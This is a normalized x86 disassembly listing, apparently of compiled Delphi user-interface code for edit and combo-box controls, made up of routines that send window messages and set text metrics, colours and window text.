mov eax esi
call sub_436b38
mov dl 0x1
mov eax esi
call sub_43dd74
xor edx edx
mov eax esi
call sub_43751c
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_42e870
mov eax esi
test bl bl
je r-xdata
sub_42e208
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_43db40
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e288
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_43de44
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_42e2cc
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_43de44
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_43db40
push eax
call SendMessageA
test eax eax
setne bl
sub_42e304
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43de44
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_43db40
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e33c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e3c0
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_43de44
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_43db40
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x4 ]
call sub_40442c
mov edx eax
mov eax ebx
call sub_437334
sub_42e3c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_43de44
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_43db40
push eax
call SendMessageA
sub_42e400
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43db40
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_42e424
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_43db40
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e444
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43db40
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42e474
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43db40
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_43db40
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_43db40
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42e510
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4372cc
inc eax
call sub_408544
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408558
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4372dc
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4083a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e5a1
mov eax [ ebp - 0xc ]
call sub_408590
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_42e5ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_40405c
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_4372cc
inc eax
call sub_408544
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408558
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4372dc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408590
retn
sub_42e648
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a9cc
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43a8f8
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42e701
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_43acc8
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_43acc8
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_42e774
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43aaf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e7ba
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_42e7ba
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_42e304
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42e834
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SendMessageA
sub_42e834
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_42e870
pop ebx
retn
sub_42e870
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41c24c
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_436b38
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_42e93c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_43b6b8
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_42e974
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_43db40
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_43db40
push eax
call SendMessageA
sub_42e9b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43d158
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_42e834
mov eax ebx
call sub_43b0e0
sub_42e9e8
push ebx
mov ebx eax
mov eax ebx
call sub_43d09c
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_42e870
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_42ea30
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43cef4
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_43db40
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_42e4f4
sub_42ea6c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43de44
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403430
push 0xfffffff0
mov eax esi
call sub_43db40
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_42eaa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_43ec20
pop esi
pop ebx
retn
sub_42eadc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eb49
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41440c
sub_42eb54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42eb78
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_4045b8
mov edx esi
xchg edx eax
call sub_4045b8
mov eax [ esi ]
call sub_40442c
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42ebd0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_437358
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_437388
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec3b
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_42ec40
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42ec60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40442c
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42ec88
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_43db40
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_437894
sub_42ecbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40442c
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed36
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
sub_42ed40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_40442c
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42edba
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
sub_42edc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43986c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_436b14
mov edx 0x19
mov eax ebx
call sub_436b38
mov dl 0x1
mov eax ebx
call sub_43dd74
xor edx edx
mov eax ebx
call sub_43751c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_435f34
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_42f164
call sub_41a284
mov [ ebx + 0x24c ] eax
push ebx
push sub_42f25c
call sub_41a284
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_42eeb4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_43de44
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_44df60
mov eax [ esi + 0x24c ]
call sub_44df60
mov eax [ esi + 0x208 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439990
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42ef36
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_43af34
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_42ef80
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_43db40
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_42efa4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_43db40
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_43db40
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_42efec
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_43db40
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_42f018
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_43db40
push eax
call SendMessageA
sub_42f054
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_43de44
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_43db40
push eax
call SendMessageA
sub_42f0a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_43db40
push eax
call SetWindowTextA
sub_42f0e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_42ef80
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_42f118
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43d158
pop esi
pop ebx
retn
mov eax ebx
call sub_43b0e0
sub_42f13c
push ebx
mov ebx eax
mov eax ebx
call sub_438f30
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f164
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_44e0b4
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_436e9c
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406864
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_437a00
jmp r-xdata
sub_42f290
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42f547
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c994
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ca7c
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ef80
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_457860
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403430
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e0b4
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42d4c8
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cb44
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ef80
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42efa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42f56c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_437ac8
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_43b554
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43cb44
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41bd78
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_41c9fc
call sub_41bd78
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_41ca38
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43b4c0
test al al
jne r-xdata
mov eax ebx
call sub_42ef80
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_42efa4
jmp r-xdata
sub_42f67a
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
